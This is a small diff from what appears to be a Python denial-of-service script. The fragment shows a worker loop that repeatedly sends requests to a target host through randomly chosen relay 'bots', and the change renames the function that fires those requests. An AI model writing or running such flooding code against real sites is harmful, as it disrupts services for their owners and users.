@@ -68,7 +68,7 @@ def dos():
 def dos2():
 	while True:
 		item=w.get()
-		bot_hammering(random.choice(bots)+"http://"+host)
+		bot_packet(random.choice(bots)+"http://"+host)
 		w.task_done()
 
 
